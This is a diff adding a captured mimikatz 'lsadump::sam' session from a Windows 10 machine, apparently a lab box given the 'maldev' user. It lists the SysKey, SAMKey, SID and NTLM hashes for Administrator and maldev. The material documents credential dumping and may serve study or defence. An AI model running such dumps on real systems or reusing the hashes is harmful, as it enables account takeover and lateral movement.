@@ -1,0 +1,22 @@
+mimikatz # lsadump::sam
+Domain : WINDOWS10ENTERP
+SysKey : df956513122e02e617ac525706384971
+Local SID : S-1-5-21-4134704610-1996190544-3930982894
+
+SAMKey : c8f07e7e0ba974c523235932cb90fc3a
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 269904b9dad6f6b2d62dda8386a61a1a
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000003e8 (1000)
+User : maldev
+  Hash NTLM: 269904b9dad6f6b2d62dda8386a61a1a
+
+mimikatz #
